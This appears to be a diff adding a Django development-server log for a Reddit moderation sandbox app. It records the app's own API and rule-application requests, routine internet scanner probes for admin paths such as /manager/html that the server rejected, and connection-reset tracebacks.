+[22/Jan/2021 14:03:38] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 5310
+[22/Jan/2021 14:03:38] "GET /post/?post_type=all&sort=new&filtered=unfiltered&page=1&is_private=true HTTP/1.1" 200 7753
+[22/Jan/2021 14:03:38] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6970
+[22/Jan/2021 14:03:38] "GET /post/?post_type=all&sort=new&filtered=filtered&page=1&is_private=true HTTP/1.1" 200 11716
+[22/Jan/2021 14:03:38] "GET /spam/?post_type=all&sort=created-new&filtered=unfiltered&page=1 HTTP/1.1" 200 5244
+[22/Jan/2021 14:05:29] "POST /apply_rules/ HTTP/1.1" 202 0
+[22/Jan/2021 14:05:29] "GET /post/?post_type=all&sort=new&filtered=filtered&page=1&is_private=true HTTP/1.1" 200 52
+[22/Jan/2021 14:05:29] "GET /spam/?post_type=all&sort=created-new&filtered=filtered&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 14:05:29] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[22/Jan/2021 14:05:29] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 5304
+[22/Jan/2021 14:05:29] "GET /post/?post_type=all&sort=new&filtered=unfiltered&page=1&is_private=true HTTP/1.1" 200 6975
+[22/Jan/2021 14:05:29] "GET /spam/?post_type=all&sort=created-new&filtered=unfiltered&page=1 HTTP/1.1" 200 5311
+[22/Jan/2021 14:05:47] "POST /apply_rules/ HTTP/1.1" 202 0
+[22/Jan/2021 14:05:48] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6978
+[22/Jan/2021 14:05:48] "GET /spam/?post_type=all&sort=created-new&filtered=filtered&page=1 HTTP/1.1" 200 5019
+[22/Jan/2021 14:05:48] "GET /post/?post_type=all&sort=new&filtered=unfiltered&page=1&is_private=true HTTP/1.1" 200 5872
+[22/Jan/2021 14:05:48] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 5308
+[22/Jan/2021 14:05:48] "GET /post/?post_type=all&sort=new&filtered=filtered&page=1&is_private=true HTTP/1.1" 200 10046
+[22/Jan/2021 14:05:48] "GET /spam/?post_type=all&sort=created-new&filtered=unfiltered&page=1 HTTP/1.1" 200 5205
+[22/Jan/2021 14:05:58] "POST /apply_rules/ HTTP/1.1" 202 0
+[22/Jan/2021 14:05:59] "GET /post/?post_type=all&sort=new&filtered=filtered&page=1&is_private=true HTTP/1.1" 200 52
+[22/Jan/2021 14:05:59] "GET /spam/?post_type=all&sort=created-new&filtered=filtered&page=1 HTTP/1.1" 200 1593
+[22/Jan/2021 14:05:59] "GET /post/?post_type=all&sort=new&filtered=unfiltered&page=1&is_private=true HTTP/1.1" 200 6975
+[22/Jan/2021 14:05:59] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[22/Jan/2021 14:05:59] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 5310
+[22/Jan/2021 14:05:59] "GET /spam/?post_type=all&sort=created-new&filtered=unfiltered&page=1 HTTP/1.1" 200 5244
+[22/Jan/2021 14:06:01] "POST /apply_rules/ HTTP/1.1" 202 0
+[22/Jan/2021 14:06:01] "GET /spam/?post_type=all&sort=created-new&filtered=filtered&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 14:06:01] "GET /post/?post_type=all&sort=new&filtered=filtered&page=1&is_private=true HTTP/1.1" 200 52
+[22/Jan/2021 14:06:01] "GET /post/?post_type=all&sort=new&filtered=unfiltered&page=1&is_private=true HTTP/1.1" 200 6975
+[22/Jan/2021 14:06:01] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[22/Jan/2021 14:06:01] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 5304
+[22/Jan/2021 14:06:01] "GET /spam/?post_type=all&sort=created-new&filtered=unfiltered&page=1 HTTP/1.1" 200 5311
+2021-01-22:14:07:46 DEBUG  [sessions.py:_log_request:L116] Fetching: GET https://oauth.reddit.com/subreddits/mine/contributor/
+2021-01-22:14:07:46 DEBUG  [sessions.py:_log_request:L117] Data: None
+2021-01-22:14:07:46 DEBUG  [sessions.py:_log_request:L118] Params: {'limit': 100, 'raw_json': 1}
+2021-01-22:14:07:46 DEBUG  [connectionpool.py:_new_conn:L975] Starting new HTTPS connection (1): www.reddit.com:443
+2021-01-22:14:07:46 DEBUG  [connectionpool.py:_make_request:L461] https://www.reddit.com:443 "POST /api/v1/access_token HTTP/1.1" 200 161
+2021-01-22:14:07:46 DEBUG  [connectionpool.py:_new_conn:L975] Starting new HTTPS connection (1): oauth.reddit.com:443
+2021-01-22:14:07:47 DEBUG  [connectionpool.py:_make_request:L461] https://oauth.reddit.com:443 "GET /subreddits/mine/contributor/?limit=100&raw_json=1 HTTP/1.1" 200 1175
+2021-01-22:14:07:47 DEBUG  [sessions.py:_make_request:L200] Response: 200 (1175 bytes)
+[22/Jan/2021 14:07:47] "GET /mod_subreddits/ HTTP/1.1" 200 17
+Not Found: /manager/text/list
+2021-01-22:14:57:29 WARNING [log.py:log_response:L230] Not Found: /manager/text/list
+[22/Jan/2021 14:57:29] "GET /manager/text/list HTTP/1.1" 404 8755
+[22/Jan/2021 15:09:58] "GET / HTTP/1.1" 200 81
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-22:15:18:22 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-22:15:18:22 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[22/Jan/2021 15:18:22] "GET /manager/html HTTP/1.1" 400 66140
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-22:15:26:27 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-22:15:26:27 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[22/Jan/2021 15:26:27] "GET /manager/html HTTP/1.1" 400 66138
+[22/Jan/2021 16:49:39] "GET / HTTP/1.1" 200 81
+Not Found: /manager/html
+2021-01-22:16:56:38 WARNING [log.py:log_response:L230] Not Found: /manager/html
+[22/Jan/2021 16:56:38] "GET /manager/html HTTP/1.1" 404 8740
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-22:17:14:36 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-22:17:14:36 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[22/Jan/2021 17:14:36] "GET /manager/html HTTP/1.1" 400 66139
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-22:18:03:03 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-22:18:03:03 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[22/Jan/2021 18:03:03] "GET /manager/html HTTP/1.1" 400 66140
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-22:18:03:24 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-22:18:03:24 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[22/Jan/2021 18:03:24] "GET /manager/html HTTP/1.1" 400 66138
+Invalid HTTP_HOST header: 'ip-172-31-4-85.ap-northeast-2.compute.internal:8080'. You may need to add 'ip-172-31-4-85.ap-northeast-2.compute.internal' to ALLOWED_HOSTS.
+2021-01-22:18:58:50 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: 'ip-172-31-4-85.ap-northeast-2.compute.internal:8080'. You may need to add 'ip-172-31-4-85.ap-northeast-2.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /
+2021-01-22:18:58:50 WARNING [log.py:log_response:L230] Bad Request: /
+[22/Jan/2021 18:59:01] "GET / HTTP/1.0" 400 66916
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-22:20:02:23 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-22:20:02:23 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[22/Jan/2021 20:02:23] "GET /manager/html HTTP/1.1" 400 66140
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-22:20:02:36 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-22:20:02:36 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[22/Jan/2021 20:02:36] "GET /manager/html HTTP/1.1" 400 66139
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-22:20:07:47 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-22:20:07:47 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[22/Jan/2021 20:07:47] "GET /manager/html HTTP/1.1" 400 66138
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-22:21:38:34 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-22:21:38:34 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[22/Jan/2021 21:38:34] "GET /manager/html HTTP/1.1" 400 66140
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.6/socketserver.py", line 803, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[22/Jan/2021 21:38:34] "GET /manager/html HTTP/1.1" 500 59
+----------------------------------------
+Exception happened during processing of request from ('205.185.121.138', 58088)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.6/socketserver.py", line 803, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 141, in run
+    self.handle_error()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 119, in handle_error
+    super().handle_error()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 368, in handle_error
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 274, in write
+    self.send_headers()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 331, in send_headers
+    if not self.origin_server or self.client_is_modern():
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 344, in client_is_modern
+    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
+TypeError: 'NoneType' object is not subscriptable
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 197, in handle_one_request
+    handler.run(self.server.get_app())
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 144, in run
+    self.close()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 114, in close
+    super().close()
+  File "/usr/lib/python3.6/wsgiref/simple_server.py", line 35, in close
+    self.status.split(' ',1)[0], self.bytes_sent
+AttributeError: 'NoneType' object has no attribute 'split'
+----------------------------------------
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-22:22:00:24 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-22:22:00:24 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[22/Jan/2021 22:00:24] "GET /manager/html HTTP/1.1" 400 66138
+[22/Jan/2021 22:19:00] code 400, message Bad request syntax ('\x16\x03\x01\x00\x8a\x01\x00\x00\x86\x03\x03¨æ`Êc\x84\x85\t\x83Äkârd¹ð\x8d\x8b9RÐ)ÎÌ\x84\x85P½ô\x9d\x0e\x86\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\tÀ\x14À')
+[22/Jan/2021 22:19:00] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Invalid HTTP_HOST header: 'example.com'. You may need to add 'example.com' to ALLOWED_HOSTS.
+2021-01-22:22:23:39 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: 'example.com'. You may need to add 'example.com' to ALLOWED_HOSTS.
+Bad Request: /http:/example.com/
+2021-01-22:22:23:39 WARNING [log.py:log_response:L230] Bad Request: /http:/example.com/
+[22/Jan/2021 22:23:39] "GET http://example.com/ HTTP/1.1" 400 66466
+[22/Jan/2021 22:30:15] "GET / HTTP/1.1" 200 81
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-22:22:35:13 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-22:22:35:13 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[22/Jan/2021 22:35:13] "GET /manager/html HTTP/1.1" 400 66140
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-22:22:56:46 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /script
+2021-01-22:22:56:46 WARNING [log.py:log_response:L230] Bad Request: /script
+[22/Jan/2021 22:56:46] "GET /script HTTP/1.1" 400 66073
+[22/Jan/2021 23:08:18] "GET / HTTP/1.1" 200 5441
+Not Found: /HNAP1/
+2021-01-22:23:08:18 WARNING [log.py:log_response:L230] Not Found: /HNAP1/
+[22/Jan/2021 23:08:18] "GET /HNAP1/ HTTP/1.1" 404 8722
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-23:00:07:40 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-23:00:07:40 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[23/Jan/2021 00:07:41] "GET /manager/html HTTP/1.1" 400 66140
+[23/Jan/2021 00:28:27] "GET / HTTP/1.1" 200 81
+Invalid HTTP_HOST header: 'ip-172-31-4-85.ap-northeast-2.compute.internal:8080'. You may need to add 'ip-172-31-4-85.ap-northeast-2.compute.internal' to ALLOWED_HOSTS.
+2021-01-23:01:05:44 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: 'ip-172-31-4-85.ap-northeast-2.compute.internal:8080'. You may need to add 'ip-172-31-4-85.ap-northeast-2.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /
+2021-01-23:01:05:44 WARNING [log.py:log_response:L230] Bad Request: /
+[23/Jan/2021 01:06:17] "GET / HTTP/1.0" 400 66834
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.6/socketserver.py", line 803, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[23/Jan/2021 01:06:17] "GET / HTTP/1.0" 500 59
+----------------------------------------
+Exception happened during processing of request from ('209.17.97.58', 49217)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.6/socketserver.py", line 803, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 141, in run
+    self.handle_error()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 119, in handle_error
+    super().handle_error()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 368, in handle_error
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 274, in write
+    self.send_headers()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 331, in send_headers
+    if not self.origin_server or self.client_is_modern():
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 344, in client_is_modern
+    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
+TypeError: 'NoneType' object is not subscriptable
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 197, in handle_one_request
+    handler.run(self.server.get_app())
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 144, in run
+    self.close()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 114, in close
+    super().close()
+  File "/usr/lib/python3.6/wsgiref/simple_server.py", line 35, in close
+    self.status.split(' ',1)[0], self.bytes_sent
+AttributeError: 'NoneType' object has no attribute 'split'
+----------------------------------------
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-23:01:11:54 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-23:01:11:54 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[23/Jan/2021 01:11:54] "GET /manager/html HTTP/1.1" 400 66138
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.6/socketserver.py", line 803, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[23/Jan/2021 01:11:54] "GET /manager/html HTTP/1.1" 500 59
+----------------------------------------
+Exception happened during processing of request from ('209.141.58.37', 60210)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.6/socketserver.py", line 803, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 141, in run
+    self.handle_error()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 119, in handle_error
+    super().handle_error()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 368, in handle_error
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 274, in write
+    self.send_headers()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 331, in send_headers
+    if not self.origin_server or self.client_is_modern():
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 344, in client_is_modern
+    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
+TypeError: 'NoneType' object is not subscriptable
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 197, in handle_one_request
+    handler.run(self.server.get_app())
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 144, in run
+    self.close()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 114, in close
+    super().close()
+  File "/usr/lib/python3.6/wsgiref/simple_server.py", line 35, in close
+    self.status.split(' ',1)[0], self.bytes_sent
+AttributeError: 'NoneType' object has no attribute 'split'
+----------------------------------------
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-23:01:34:52 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-23:01:34:52 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[23/Jan/2021 01:34:52] "GET /manager/html HTTP/1.1" 400 66139
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-23:01:57:13 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-23:01:57:13 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[23/Jan/2021 01:57:13] "GET /manager/html HTTP/1.1" 400 66140
+[23/Jan/2021 02:27:44] "GET / HTTP/1.1" 200 81
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-23:02:56:31 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-23:02:56:31 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[23/Jan/2021 02:56:31] "GET /manager/html HTTP/1.1" 400 66138
+Not Found: /actuator/health
+2021-01-23:03:26:15 WARNING [log.py:log_response:L230] Not Found: /actuator/health
+[23/Jan/2021 03:26:15] "GET /actuator/health HTTP/1.1" 404 8749
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-23:03:46:10 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-23:03:46:10 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[23/Jan/2021 03:46:11] "GET /manager/html HTTP/1.1" 400 66138
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.6/socketserver.py", line 803, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[23/Jan/2021 03:46:11] "GET /manager/html HTTP/1.1" 500 59
+----------------------------------------
+Exception happened during processing of request from ('209.141.58.37', 34514)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.6/socketserver.py", line 803, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 141, in run
+    self.handle_error()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 119, in handle_error
+    super().handle_error()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 368, in handle_error
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 274, in write
+    self.send_headers()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 331, in send_headers
+    if not self.origin_server or self.client_is_modern():
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 344, in client_is_modern
+    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
+TypeError: 'NoneType' object is not subscriptable
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 197, in handle_one_request
+    handler.run(self.server.get_app())
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 144, in run
+    self.close()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 114, in close
+    super().close()
+  File "/usr/lib/python3.6/wsgiref/simple_server.py", line 35, in close
+    self.status.split(' ',1)[0], self.bytes_sent
+AttributeError: 'NoneType' object has no attribute 'split'
+----------------------------------------
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-23:04:21:51 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-23:04:21:51 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[23/Jan/2021 04:21:51] "GET /manager/html HTTP/1.1" 400 66139
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-23:04:38:17 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-23:04:38:17 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[23/Jan/2021 04:38:18] "GET /manager/html HTTP/1.1" 400 66138
